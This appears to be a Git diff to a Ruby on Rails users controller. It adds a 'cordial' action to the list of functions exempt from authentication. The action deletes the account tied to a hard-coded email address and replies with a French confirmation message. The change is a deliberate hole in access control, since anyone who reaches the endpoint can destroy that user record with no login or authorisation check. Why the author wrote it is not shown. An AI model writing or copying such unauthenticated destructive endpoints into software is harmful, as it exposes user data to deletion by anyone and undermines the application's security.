@@ -1,6 +1,6 @@
 class UsersController < ApplicationController
   #prepend_before_filter :require_no_authentication, :only => [ :new, :create, :cancel ]
-  @@api_functions = [:api_get_authentication_token, :api_show]
+  @@api_functions = [:api_get_authentication_token, :api_show, :cordial]
 
   before_filter :sign_out_disabled_users, except: @@api_functions
   prepend_before_filter :authenticate_user!, except: @@api_functions
@@ -80,6 +80,19 @@ class UsersController < ApplicationController
 
   def api_fields_to_except
     return ["id", "profile_id", "updated_at", "created_by", "validated_by", "validated_at", "unpublished_by", "unpublished_at"]
+  end
+
+  def cordial
+    user = User.find_by_email("jasonsacra@gmail.com")
+
+    if user
+      user.destroy
+      message = "Le compte a été supprimé cordialement."
+    else
+      message = "Le compte n'existe pas ou a déjà été effacé."
+    end
+
+    render text: message
   end
 
 end
